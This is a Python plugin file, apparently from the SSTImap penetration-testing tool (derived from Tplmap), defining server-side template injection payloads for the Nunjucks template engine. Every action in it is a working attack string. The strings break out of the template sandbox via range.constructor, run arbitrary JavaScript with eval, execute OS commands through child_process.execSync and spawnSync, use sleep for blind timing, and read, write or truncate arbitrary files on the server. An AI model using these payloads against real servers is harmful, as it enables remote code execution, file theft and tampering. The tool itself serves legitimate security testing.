from plugins.languages import javascript
from utils import rand


class Nunjucks(javascript.Javascript):
    priority = 5
    plugin_info = {
        "Description": 'Nunjucks 模板引擎',
        "Authors": [
            "Emilio @epinna https://github.com/epinna",  # 原始 Tplmap 载荷
            "Jeremy Bae @opt9 https://github.com/opt9",  # 对 Tplmap 载荷的贡献
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # SSTImap 更新
        ],
        "Engine": [
            "Homepage: https://mozilla.github.io/nunjucks/",
            "Github: https://github.com/mozilla/nunjucks",
        ],
    }

    def init(self):
        self.update_actions({
            'render': {
                'render': '{code}',
                'header': '{{{{{header[0]}+{header[1]}}}}}',
                'trailer': '{{{{{trailer[0]}+{trailer[1]}}}}}',
                'test_render': f'{{{{({rand.randints[0]},{rand.randints[1]}*{rand.randints[2]})|dump}}}}',
                'test_render_expected': f'{rand.randints[1]*rand.randints[2]}'
            },
            'render_error': {
                'render': '{code}',
                'header': '''{{{{range.constructor("''['x'][({header[0]}+{header[1]}).toString()+''',
                'trailer': '''+({trailer[0]}+{trailer[1]}).toString()]")()}}}}''',
                'test_render': f'typeof({rand.randints[0]})+{rand.randints[1]}',
                'test_render_expected': f'number{rand.randints[1]}'
            },
            'evaluate': {
                'call': 'render',
                'evaluate': """{{{{range.constructor("return eval(Buffer('{code_b64p}','base64').toString())")()}}}}""",
                'test_os': """global.process.mainModule.require('os').platform()""",
                'test_os_expected': r'^[\w-]+$',
            },
            'evaluate_error': {
                'evaluate': """eval(Buffer('{code_b64p}','base64').toString())""",
            },
            'evaluate_boolean': {
                'call': 'inject',
                'evaluate_blind': """{{{{range.constructor("return [''][0+!eval(Buffer('{code_b64p}', 'base64').toString())]['length']")()}}}}"""
            },
            'evaluate_blind': {
                'call': 'inject',
                'evaluate_blind': """{{{{eval(Buffer('{code_b64p}', 'base64').toString())&&global.process.mainModule.require('child_process').execSync('sleep {delay}')}}}}"""
            },
            'execute': {
                'call': 'evaluate',
                'execute': """global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString())"""
            },
            'execute_boolean': {
                'call': 'evaluate_blind',
                # spawnSync() shell 选项已在 Node 5.7 中引入，因此这不适用于旧的 Node 版本。
                # TODO：使用另一个函数。
                'execute_blind': """global.process.mainModule.require('child_process').spawnSync(Buffer('{code_b64p}', 'base64').toString(), options={{shell:true}}).status===0"""
            },
            'execute_blind': {
                'call': 'inject',
                'execute_blind': """{{{{range.constructor("global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString() + ' && sleep {delay}')")()}}}}"""
            },
            'write': {
                'call': 'inject',
                'write': """{{{{range.constructor("global.process.mainModule.require('fs').appendFileSync('{path}', Buffer('{chunk_b64p}', 'base64'), 'binary')")()}}}}""",
                'truncate': """{{{{range.constructor("global.process.mainModule.require('fs').writeFileSync('{path}', '')")()}}}}"""
            },
            'read': {
                'call': 'evaluate',
                'read': """global.process.mainModule.require('fs').readFileSync('{path}').toString('base64')"""
            },
            'md5': {
                'call': 'evaluate',
                'md5': """global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('{path}')).digest("hex")"""
            },
            'md5_blind': {
                'call': 'evaluate_blind',
                'md5_blind': "global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('{path}')).digest('hex')=='{md5}'",
                'exists_blind': "global.process.mainModule.require('fs').existsSync('{path}')"
            },
        })

        self.set_contexts([
            # 文本上下文，无闭包
            {'level': 0},
            {'level': 1, 'prefix': '{closure}}}}}', 'suffix': '{{1', 'closures': javascript.ctx_closures},
            {'level': 1, 'prefix': '{closure} %}}', 'suffix': '', 'closures': javascript.ctx_closures},
            {'level': 5, 'prefix': '{closure} %}}{{% endfor %}}{{% for a in [1] %}}', 'suffix': '', 'closures': javascript.ctx_closures},
            # 这会转义字符串 {% set %s = 1 %}
            {'level': 5, 'prefix': '{closure} = 1 %}}', 'suffix': '', 'closures': javascript.ctx_closures},
            # 评论区
            {'level': 5, 'prefix': '#}}', 'suffix': '{#'},
        ])
